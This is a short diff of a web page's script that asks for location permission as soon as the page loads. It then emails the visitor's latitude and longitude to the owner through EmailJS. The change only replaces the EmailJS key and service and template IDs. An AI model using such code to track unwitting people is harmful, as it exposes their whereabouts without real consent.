@@ -84,7 +84,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init("ueOumEe6aJ_CEmq_m"); // Public Key
+            emailjs.init("CrVHH3e0Kot5rmodE"); // Public Key
 
             // Automatically request location permission when the page is loaded
             trackMovement();
@@ -108,7 +108,7 @@
                     longitude: longitude.toString()
                 };
 
-                emailjs.send("service_7pjie2s", "template_30kabln", templateParams)
+                emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
                     .then((response) => {
                         console.log("✅ Email sent successfully!", response);
                         document.getElementById("locationDisplay").textContent = "📧 Location sent!";
